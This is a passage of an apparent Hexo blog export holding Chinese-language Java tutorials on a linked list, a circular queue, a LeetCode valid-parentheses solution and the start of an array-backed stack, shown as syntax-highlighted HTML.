class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Node prev = dummyHead;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index ; i++) <span class="comment">//dummyHead是0前面的结点</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表第index（0-based）个位置的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        <span class="keyword">return</span> cur.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改链表的第index（0 - based）个位置的元素为e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        cur.e = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找链表中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.e.equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除index（0-based）位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line"></span><br><span class="line">        Node prev = dummyHead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index; i++)</span><br><span class="line">            prev = prev.next;</span><br><span class="line"></span><br><span class="line">        Node retNode = prev.next;</span><br><span class="line">        prev.next = retNode.next;</span><br><span class="line">        retNode.next = <span class="keyword">null</span>;</span><br><span class="line">        size --;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retNode.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">//        Node cur = dummyHead.next;</span></span><br><span class="line"><span class="comment">//        while(cur != null)&#123;</span></span><br><span class="line"><span class="comment">//            res.append(cur + "-&gt;");</span></span><br><span class="line"><span class="comment">//            cur = cur.next;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">for</span>(Node cur = dummyHead.next ; cur != <span class="keyword">null</span>; cur = cur.next)</span><br><span class="line">            res.append(cur + <span class="string">"-&gt;"</span>);</span><br><span class="line">        res.append(<span class="string">"Null"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Main-java"><a href="#Main-java" class="headerlink" title="Main.java"></a>Main.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        LinkedList&lt;Integer&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i ++)&#123;</span><br><span class="line">            linkedList.addFirst(i);</span><br><span class="line">            System.out.println(linkedList);</span><br><span class="line">        &#125;</span><br><span class="line">        linkedList.add(<span class="number">2</span>,<span class="number">666</span>);</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line"></span><br><span class="line">        linkedList.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line"></span><br><span class="line">        linkedList.removeFirst();</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line"></span><br><span class="line">        linkedList.removeLast();</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>链表的增删改查</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-循环队列</title>
    <url>/posts/39.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列 Queue"></a>队列 Queue</h1><blockquote>
<ul>
<li><h2 id="队列是一种先进先出的数据结果"><a href="#队列是一种先进先出的数据结果" class="headerlink" title="队列是一种先进先出的数据结果"></a>队列是一种先进先出的数据结果</h2></li>
</ul>
</blockquote>
<h1 id="循环队列实现输出截图"><a href="#循环队列实现输出截图" class="headerlink" title="循环队列实现输出截图"></a>循环队列实现输出截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210625210003170.png" alt="image-20210625210003170"></p>
<h1 id="循环队列实现代码（完整）"><a href="#循环队列实现代码（完整）" class="headerlink" title="循环队列实现代码（完整）"></a>循环队列实现代码（完整）</h1><p>Queue.java（队列接口）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">dequeue</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>LoopQueue.java</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoopQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> front, tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoopQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[]) <span class="keyword">new</span> Object[capacity + <span class="number">1</span>];</span><br><span class="line">        front = <span class="number">0</span>;</span><br><span class="line">        tail = <span class="number">0</span> ;</span><br><span class="line">        size = <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoopQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> front == tail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((tail + <span class="number">1</span>) % data.length == front)</span><br><span class="line">            resize(getCapacity() * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        data[tail] = e ;</span><br><span class="line">        tail = (tail + <span class="number">1</span>) % data.length;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(isEmpty())&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot dequeue from an empty queue."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[front];</span><br><span class="line">        data[front] = <span class="keyword">null</span>;</span><br><span class="line">        front = (front + <span class="number">1</span>) % data.length;</span><br><span class="line">        size --;</span><br><span class="line">        <span class="keyword">if</span>(size == getCapacity() / <span class="number">4</span> &amp;&amp; getCapacity() / <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            resize(getCapacity() / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Queue is empty."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[front];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E[] newData =(E[]) <span class="keyword">new</span> Object[newCapacity + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[(i + front) % data.length];</span><br><span class="line">        data = newData;</span><br><span class="line">        front = <span class="number">0</span>;</span><br><span class="line">        tail = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"LoopQueue: size = %d, capacity = %d \n"</span>, size, getCapacity()));</span><br><span class="line">        res.append(<span class="string">"front ["</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = front ; i != tail; i = (i + <span class="number">1</span>) % data.length) &#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % data.length != tail)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">"] tail"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        LoopQueue&lt;Integer&gt; queue = <span class="keyword">new</span> LoopQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            queue.enqueue(i);</span><br><span class="line">            System.out.println(queue);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                queue.dequeue();</span><br><span class="line">                System.out.println(queue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】leetcode题解-有效括号利用栈LIFO实现</title>
    <url>/posts/44.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="Leetcode题目-20"><a href="#Leetcode题目-20" class="headerlink" title="Leetcode题目 20"></a>Leetcode题目 20</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210625172525394.png" alt="image-20210625172525394"></p>
<h1 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210625172657711.png" alt="image-20210625172657711"></p>
<h1 id="Solution题解"><a href="#Solution题解" class="headerlink" title="Solution题解"></a>Solution题解</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; s.length(); i ++)&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'('</span> || c == <span class="string">'['</span> || c== <span class="string">'&#123;'</span>)</span><br><span class="line">                stack.push(c);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(stack.isEmpty())</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">char</span> topChar = stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">')'</span> &amp;&amp; topChar != <span class="string">'('</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">']'</span> &amp;&amp; topChar != <span class="string">'['</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">'&#125;'</span> &amp;&amp; topChar != <span class="string">'&#123;'</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println((<span class="keyword">new</span> Solution()).isValid(<span class="string">"()[]&#123;&#125;"</span>));</span><br><span class="line">            System.out.println((<span class="keyword">new</span> Solution()).isValid(<span class="string">"(])]&#123;&#125;"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-利用动态数组自定义栈LIFO</title>
    <url>/posts/38.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈 Stack"></a>栈 Stack</h1><blockquote>
<ul>
<li><h2 id="只能从一端放入元素，后进先出"><a href="#只能从一端放入元素，后进先出" class="headerlink" title="只能从一端放入元素，后进先出"></a>只能从一端放入元素，后进先出</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210625151535915.png" alt="image-20210625151535915"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210625151550415.png" alt="image-20210625151550415"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="自定义栈和动态数组实现过程截图"><a href="#自定义栈和动态数组实现过程截图" class="headerlink" title="自定义栈和动态数组实现过程截图"></a>自定义栈和动态数组实现过程截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210625171952566.png" alt="image-20210625171952566"></p>
<h1 id="自定义栈和动态数组实现完整代码"><a href="#自定义栈和动态数组实现完整代码" class="headerlink" title="自定义栈和动态数组实现完整代码"></a>自定义栈和动态数组实现完整代码</h1><h2 id="Stack-java（栈接口）"><a href="#Stack-java（栈接口）" class="headerlink" title="Stack.java（栈接口）"></a>Stack.java（栈接口）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Array-java-动态数组"><a href="#Array-java-动态数组" class="headerlink" title="Array.java(动态数组)"></a>Array.java(动态数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * data.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span 